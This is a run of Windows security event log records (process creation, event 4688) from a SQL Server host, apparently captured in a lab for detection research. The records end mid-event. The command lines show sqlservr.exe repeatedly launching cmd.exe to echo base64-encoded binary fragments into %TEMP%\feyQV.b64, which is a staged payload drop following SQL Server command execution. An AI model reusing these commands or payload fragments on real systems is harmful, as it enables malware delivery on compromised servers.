<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.404502500Z" />
      <EventRecordID>1331341</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x370</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo SBK5iQKLRdCLEBL7phCLeBCF9o1MMgHmgAAAAImNEHQwi8fR+u3CCYlF2YrDJD+JTdeSFQTXiAGLw7kGsGUAnNS+AMOLTfiL2ItF/E6L+nXQi1UMCtiIWf/+AoUuiUX8D4Wy/v//X6pbi+Vd0hAAX164eBEBAFtF5V3CPAB0kbgWAHEAW4vlXZoQAJCQkJCQkBWQ7Y+QgJBV5OyL3giD6ETkEP+zDDVAAMcAsScAADPAXcN9RRSLTRAvVVBQUVJMFFcAAIPEDF3DkJCQkJCQkJCQkJCQkJCQus/s3UUQi00Mg+0QcxD/kXjBQADHeBwAswAzwP3DU1ZbdQhXvwQAawCKFkY8Y4hFEHYai0UQu2QAUQAlCgCkAJn3+wQwiLwQiAFB6wQ8REMXi0UQuwoAAAA1/wBwAJn3+wQwiAFBisIEMIgBycYBLkFPdbWLRQxfXsZBvBZbXcNVi+yD7AwJSYt1d1eDPgB3EYsGAAAAAIzPM8Bbi+VdwgwAi10Ii0MY9sQCdGV/QwyFWXXpiwNqFFAV/+jQm2n/i0+JOIB4BInTCIkE81dXNol4IFeJvFf/FaDA1wCLUwyJ0mHiQwyLSMqFyXUlizW0wLxj/9aFwHUJX15bi+VdwgwA/9ZfwgCA/AoAW4vlhcIMAOpDMIOfMDvHi0UMdCiKmDCICIsWQEqJFol7MIsOiUUMhcl1Ecf9ActRAF9eM8Bbi+VdwgyqikssVzcPhDUBAACLU1iLPlKJ3EuJ5/jonaJ2/4PbSAF1LVOBkQNrADPJiUUIOxh0T4tDWFDomPP//4tFCF9eW4vlXcIMAIlLPIlLSIlLRMdFCAAAAFR8A4t9+IX/GIadAHgA4Us8OkNEO8hyN4tDQItLOO5VGlIgUfXo6gAAAItNzzuXB8QQO/iJRQh0ZFX4UItDVAPxiUtEE8KJc1CJ2FQEUzyLU4SLQ0Q4wjn4dwKLoouBOKdE/ET4A/LUSMHpAodTi8qPVfyD4QMD3fOkAHMsdE34bPAryItFCIlbdyZ1EPpVpoWmiWH4D4S8////Ew49JxEBADBnx0PNAdsAWHFF/ItNDK3BiQbsB8dFCAAnAACLQ1iUbQ3z//8XRQhfBFvD5V02XQCLFitNDFFSUGjoMwAAAIMkED1+EQF4iUUIVQfHQygBPwAAi0UmX4kGi0UIXluL5V3CDACVkJCQ8pCQC/+QkJCQkFUQGIuLyggci30Qi0YQi04UC8HHRRIAAAAAdXOKRgiE7HTVi1YEjSgIagBRagBqAGoA3v8VDMBAAB3GdTWLNZjAQAD/mIXAdQmLTRRfXg9CvcP/1gWA/AoAPe12TgBrBbh+PgGAi5QUX16QAQCsABdd6IvqCIXAdQ6LLhRfXokCuAtmAABdw+T4dgJm+ItGDIVDdCOKTgiZyXUci05QiUgIi0ZQi70nuSAAAADo3wbOAItWDImS2PBGDBPwDFONTRBQi0Y/UVeRUP8V&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.406768100Z" />
      <EventRecordID>1331342</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x3c4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x370</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.678234600Z" />
      <EventRecordID>1331343</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x13b4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo EMBAS/vAjAczwPeJAQAAiz2YwEAAutdAfg+EG9oAAGLXBYD8CgA9ZQALAA+F/QCfAIsdnMBAAItOJYtGEIX4fBZ/HYXAdhBqABHoAwAAUc5w8AM3AOsNI8GD+P912wtf6wK1wIvSyLSLUaBS/9OLxoH/gAAAAOq/hf+4MaGECUEAi14EmsB1GFBo7ABBAC5AYRb//zHE96Ng1/oAhcB0BVP/0OtlaoGRKd43sgCLTgyDVgSNlxBqcYVR/98VksBA2cHA1QQzwOtxix2YwEAAWNOFwHRl/9OUKfwKAD1kAH35dAc9YwAhAOEsgf8CAQAAdRKLTRSLVRBOX7g8EQEAieZeXcM97fwKAJ0Si03qi1UQ7V/28xEBALIRCF3DPaZbCgD4EvpNFIsnEFtfuH4RATyJEV5dw4XAdTiLTRCFyXUSi00Uiw8QW1+4fugBAIkRJ13Di1YMhdJ0GIp1CIRodRF2VlADV4tOVH/Ren1xUIlOVAFNJYtVEFtfiRFe+TuQkJCQkJBVpexRVovtzoqELITAD4RCAAAAzE7RM8BTg/kB54lF/IlF/w+lnAAAAIvUPOX4D4SROAAA214zg///dgXPyP/rAgpLi1bwjU38agBRUFNS/xUUwEAAhcB0L4uL/ItWUItOVPfQg9EAK/gD2IlWUIX/iU5Ud8IXtAhfx0Y8AAAGsFueG+VdwgQAiz2YwEAA/9eFwHUFiUUI6wqf1wWAJAoAiUUIREX8i1ZQi/FUFtCLRQiJiFCD0QCFwPBOVHUHx+DZAABLAItFCF9bIYtrXcIEgTPAXovlmsIhB0wbkJCQkFWLoItFCI1IArhWVVVB9+mLysHpHwPRjQSVAQDfAF3CBACQkJCQDdg64JCQkCGQkFWLJItFEItNDIsdCChRUugMAAAAB8IMHZCQtpCQ0pCQVYuui1UQiUUIHFaNSv4z9leLfQyFyX5rStIzXwgUN4PGA8HqAkCK94/NQOWwUP+0njf9amQ3/oPiYtbiusHrCsDTM9tAipLex6oAoFBXihA3/opcN/+D4g/B4gIRDQbF00CEkhhpxs+IUP+KVDf/g+I/QDvxipIYxzYAiFD/fJgb+xc78n1fM8mKDD7B6QI7SoqJGMdAADvyiP3/DRQ+dXaD6APB4gRAincZ/kAAiDD/xgA96yu87j4BM9uD4gOKGcHiBMHrBAtvJYr0rMdAAIhQ/4oJg+EPihSNGMdAAIgQQBkAt0CLVeX/AAArwpdez1tdwgwAkDI4kJCQkJCQT4M9WEBBAP8pDP90JAT/a/jAQDlZw2hL/UEAplhUQQBAdCQM6JcDAABxxAzD/3Qk/qHL////99gbwFn3m0gsnMyLRCQIi0wkEAtLfnskDHUJi2IkBPfhwhAAU/fhi9iLRCQI92QkrgOEi0kkEffhA83PwhAAzMxkzMzMzMzMzMzM/yVAwUAAzIDMzMzMzOPMzFf1U63/i0TaFAvEfUVH&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.680859100Z" />
      <EventRecordID>1331344</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xf98</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x13b4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.951501700Z" />
      <EventRecordID>1331345</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xcf8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo i1QkEJLY99oV2OOJZyQUiVQkOrxEJBwLwH0Ufr50JBj32Pfag9gAiUQkHIlnJBgLwHUYi0y5GIsFJJgz0veIi9gqRCR09zOLs3FBie2LTCR+i0EkFC6yJCXR614h0dvR2AvbdfT38Yvw92QkoovIi0QkGPfmA9ELDjtUJBR30HIHO0R3+HYBTjPSi79PjQf32vdGHdoAW15fwhAAVYvsav9oYMf8AChIuUAAd6EAAAAAUGSJJQAAAADlGiBTVleJZeiD6zgAagH/FdCrQN1+BQ1UQFwAlYMNWEBBAP+3FdTAQH6LDZgLQQCJCP8V2MBAAIsNSAtBAIkIodwOQACLAKMlQEEA6J/nAACDMVANQQAAdQyJ1LlAAP8V4MBCAFnocAKTAGgMhUAARyHQbgDoWwIAAKGQXV4AiUXYjR7YUP81jAtBAI1F4FCNRdSDjUXke/+f6MBAMWjr0EAAaABf/OvoWgIAAP8VzcBAAIth4Ilm/3Xg/3XU/3Xk6ONYk9NBxDCpRdxQ/5S4wUAAi0Xsi1yLCYlN0FBR6OsBlwDHWQOLZej/ddD/FfTAQADMhczMzN3HVzMyi0SIEAvASBRIi+EkYffY99qD2ACJRCQQiXUkmpVEJBgLwH0TUVQkFNnY99qD2AArRCQYiVQkFAtedfaLTMoUi0QkEOXa9/ELRCQM9/GdnzPST3lO61OL2ItMJBSLVCQGi0QkDNGj0dnRc9HYC9t19Pfxi8j3ZCQYkfdkvBQDxsMOO1QkWXcIcr47RCQMdv/BRHwUm1ReGCsKdgwbVCQQT3kH94T32IPagNlbwhAAzMzMzMzMIKigzMwtzMyAp0BvFoD5a3MGD6/Q0/obi0XBSYSA4RXT+MPB+h+LwtPMzMzMzMzMzMzMzMxF28xRPQAQAACNOyTochSB6QCkADQtABAwlNF5PQAQAABz7CvIi7KF14vhiwiLrgRQXcyAbkBzFYD5IHMGD8fCbTPDhtAzwIDh0NPiwzPAM9LDzFNWi8UkGAtidRiLTAgUi0QkEDrS98qL2M5EJAz38YvT67aLyFBcJBSLVCQQi0QkDNPp0dvR6tF9C8l19PfzA/D3ZCQYi8iLRCQUouYD0XIOO7WgzXcIcgc7RCQMdgFOPtKLxuNbwhAAzB/MzHPMzMyA+UBzFYD5oHMGDzXQ03PDiw7O0oBBH9NPwzPAM9LDzP8l/MBAAP8l8MBAAP9k5MBAAGgAAANNaAAMAR1tDQAASVmZdDPAw8P/Jcy+WQD/JYTB8gDMzMzMzMjMzMzMzMz/0szBQM8AAAAAAEMAAEIAAAAINAAAANEAAMcAAD4AAAAAAAAAPwAAAOUAfQAAACmdAAAAAJQ4xQAAAP0AKwAAAAAAAACXAAAAAACYAABMAAAAcgAAAAAAAAAAAAAAABIAAAAAAAAAAAAAAAAAAAAUAAAA7QC1AAAAYVEcAAAAewAAAAAAtgAAAPoAAAARAABN&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.953771100Z" />
      <EventRecordID>1331346</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1030</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xcf8</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:21.224456100Z" />
      <EventRecordID>1331347</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x824</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AAAAAAAA9gAAeAAAAAAAAAAAAAAAAAAAAAC87QAAAAAA7wAAAAAAAAAAAAAAAAAAAAAAAAAAAI8AAAAAAAAAAAAAAAAAAL4AAAAhAAAAAAC7ADAAAAAANAAAAAAAqAAAAAAA+wAAACMAAAA9AAAAAAB3AAAAAAAAAAAAACwAAADRB6EAAAAAAAAAqwAA7OGiAAAAAAAAAAAAAAAAAOMAAAAAAAAAAAAAAAAAAAAAAFEAAABqAAAAfwC7AAAAAAAAAAAAAAAAAAAAM2cAAOkAAAAAXQAAAADvAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAALQAAAAAAAAAAAADNAAAAAAAAAAAAAAAAAAAhAAAAAG9eAAAAGQAAAAAAAAAgACsAAAAAARoAAAAAfAAAAEo6AAAAAEW+AH8AAAAAAADcAACFAAAAAAAAAAAAAADsAAAAdwAAAAAAAADuNgAAqgAAAAAAAAAAAHAAAMOHVWQAZmEAAAAAAAApALAAAD/8AAAAAADaAAAAAIQAAAAAaAAAAAAAAAAAAAAATQAAAAAAANdHAAAAiQDCAAAAAAAAAAAAAAAAAOkqAACBAAAAAMEAAAAAAAAAAAAAAAAAAAAAoAAAAABEAAAAAACAYTAAAAAAAAAAAAAA8ADDqtUAAAAAAAAATQAAAD8AAAAAAAAAAADUAAAAAAAAAPIAAAAAAADo4wAAAKQAAAAAAAAAACiYAAAA9osALQAAAAAAALYAAAAAAOEAAADjLwAaAAAAAAAAAI0AAAANAP4AAAAAAPthAAAAswBjAAAAVwAAAAAAAAAAAAAAAAAAAAAAALoAAAD5AABKAAAAAABsAAAAAAAAAAAAAAAAAADyAAAAAAAAAAAAvQAAAAAAAF4AAAAAAAAAAAAAzQAAAAAqAAAAXAB2owAAAAAAAABHugDXAAAAAAAXAAAATAAJKwAAAABuAPAAhgAAAACpvQAAAPiAAAAAAAAArgAAAAAAAADbAAAAALsAAOUAAAAAAHIAAAAAAJIAAAAAAt4AoQDuAFUAAAAAAAAA+QDoAAAAAAAAiQBLAAAAIwAAMAAAAAAAAEAVAOwAAADpAAAADCsAAOkAAAAAAAAAAAAAAADGAAAAAAAAaAAAAAAAAFkAAAAAAADsAAAAExIAAAAAAK0AAAAAAAAAAAAoAAAAcTkAAACyAABgAMIAADcAAAB3AAAAAAAAADYAAAAAAAAAAAAAAIxUYVgAAAAAAAAAAAAAAACtAAAAAAAAAADNAGoAAAAAAAAAAAAAAABtAFgAAAAAAAAAAAAAAAAAAAAPAG0AAABUAAAAAAAAAAAAAAAAAAAAQwAAAAAAAAAAAAAAAAAPAAAA4QCfAAAAAAAAAACBAAAAUAAAAAAAAAAAAAAAAAAAAPMA/gCRAAAAAgAAALaYNwCQAAAAGgAAW6QAPF0AAAAAAAAAAAAAAAAAAMEAWJIAABwAAABs&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:21.226781900Z" />
      <EventRecordID>1331348</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xe5c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x824</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:21.498519400Z" />
      <EventRecordID>1331349</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xea0</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AADBAAAAAAAAAAAAAAAAAAAA2pcWAFUAAAAAAAAWAAAAAACGAABWAAASAABIAAAEAAAAAAAAAAAAAAAAANQAAADkAAAAALgAuiMAAAAAAOQAAACYAO8AAAAAAAAAAAAAAAAAAAAAAAAAAACKAAAAAAAAAAAgLQAAdwAAAAAAAAAAAAAAAGsAAAAAAI0AAAAAAGsAAADgAAAAAAAAAABYAAAAAO2gAAAA3gAAAAAAVSIAAABPAAAAXgAAAAAAAAAAAAAAAAAAAAAAAAB/1wCEADwAAAAAAJ0AAAAAALkAAAA+rjcAAAAAAAC0bwAAAACLAAAAAAAAAAAAAAAAAAB8AJ8AAAAjBQAAUAAAAAAAoAAAAAAAAAAAAAAAAAAAAGD0AAAAAADgAAAAAAAAAAAAAAB/AAAAAAAAAAAAAAAAAAAAAAAA8wAAAAAAAAAATgAAAAAAxmsAAAAAPwAAAAAAAAAAAFQAAABSDAAAp1oAAAAAAAAAKwAAAJMAnQDkAADRAAAhAAARAAAAAAAAAFwAXQCjpAAAAAAAAOsAAAAAAAAAAABLAAAAAAAAAAAAAAAAAAAOAAAhGhZPAAAAjM8AAHDPAAAAAAAAUs8AAEbPAAA6zwAAKs8AABjPAAAIzwAA8s4AAN7OAADGzgAAus4AAKrOAACSzgAAes4AAF7OAABOzgAAQM4AAPrLAAAKzAAAJMwAAD7MAABMzAAAXswAAGrMAAB0zAAAhswAAJrMAACyzAAAwMwAANrMAADyzAAADM0AACbNAAA+zQAAYM0AAGjNAAB6zQAAis0AAKDNAACwzQAAwM0AANLNAADgzQAA7s0AAATOAAAWzgAANM4AAAAAAADEyQAA2MsAAMbLAAC4ywAAqMsAAJjLAACEywAAeMsAAGjLAABYywAASssAAELLAAA4ywAAKssAABTLAAAKywAAAMsAAPbKAADsygAA4MoAANjKAADOygAAxMoAALTKAACkygAAmsoAAJLKAACIygAAfsoAAHTKAABsygAAZMoAAFzKAABSygAASMoAAD7KAAA0ygAAKsoAACDKAAAWygAACsoAAALKAAD6yQAA6skAAODJAADWyQAAzMkAAOzLAADczwAA0M8AAAAAAAC6zwAAsM8AAAAAAAAHAACABAAAgAkAAIA0AACADgAAgAwAAIAVAACAFwAAgAMAAIASAACACgAAgJcAAIBzAACAdAAAgG8AAIAAAAAAAAAAADaAwUoAAAAAAgAAAEoAAAAAAAAAACABAAAAAAAAAAAAAADgP3sUrkfheoQ//Knx0k1iUD8AAAAAAABQPwAAAAAAQI9AAAAAAAAA8D8AAAAAAAAAAI3ttaD3xrA+AAAAAB8AAAA7AAAAWgAAAHgAAACXAAAAtQAAANQAAADzAAAAEQEAADABAABOAQAAMgEAAFEBAAAAAAAAHwAAAD0AAABcAAAAegAAAJkAAAC4AAAA1gAA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:21.500944900Z" />
      <EventRecordID>1331350</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x2f8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xea0</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
